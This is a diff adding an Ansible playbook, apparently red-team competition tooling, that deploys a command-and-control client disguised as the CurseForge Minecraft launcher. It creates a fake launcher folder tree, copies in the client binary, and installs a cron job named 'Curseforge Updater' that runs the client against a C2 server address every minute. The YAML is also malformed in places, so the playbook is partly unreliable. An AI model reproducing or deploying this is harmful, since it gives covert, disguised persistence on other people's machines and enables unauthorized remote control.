@@ -1,0 +1,52 @@
+#####################################################################################
+#####                         MINEC2RAFT - Linux Edition                        #####
+##### Author: Austin Hall                                                       #####
+##### If ur not RIT Red team, don't use!!!!!                                    #####
+##### (pls and thanku :) )                                                      #####
+#####################################################################################
+
+---
+- name: Deploy MineC2raft Client
+  vars:
+      client_source: ""
+      base_dir: "{{ ansible_user_dir }}"
+      server_ip: "0.0.0.0/55565"
+
+
+- name: Create Curseforge directory structure (Linux)
+  ansible.builtin.file:
+  path: "{{ item }}"
+  state: directory
+  loop:
+  - "{{ base_dir }}/curseforge/minec2raft"
+  - "{{ base_dir }}/curseforge/minec2raft/Downloads"
+  - "{{ base_dir }}/curseforge/minec2raft/Instances"
+  - "{{ base_dir }}/curseforge/minec2raft/Quickplay"
+  - "{{ base_dir }}/curseforge/minec2raft/Install/assets"
+  - "{{ base_dir }}/curseforge/minec2raft/Install/java"
+  - "{{ base_dir }}/curseforge/minec2raft/Install/libraries"
+  - "{{ base_dir }}/curseforge/minec2raft/Install/natives"
+  - "{{ base_dir }}/curseforge/minec2raft/Install/versions"
+  mode: '0755'
+  when: ansible_os_family == 'Linux'
+
+- name: Send Client (Linux)
+  ansible.builtin.copy:
+  src: "{{ client_source }}" 
+  dest: "{{ base_dir }}/curseforge/minec2raft/Install"
+  mode: '0644'
+  when: ansible_os_family == 'Linux'
+
+- name: "Ensure Curseforge binary is executable"
+  ansible.builtin.file:
+  path: "{{ base_dir }}/curseforge/minec2raft/Install/Curseforge"
+  mode: '0755'
+  when: ansible_os_family == 'Linux'
+
+- name: Create Cron Job
+  ansible.builtin.cron:
+    name: "Curseforge Updater" 
+    job: "{{ base_dir }}/curseforge/minec2raft/Install/Curseforge {{ server_ip }}"
+    minute: "*"
+  when: ansible_os_family == 'Linux'
+
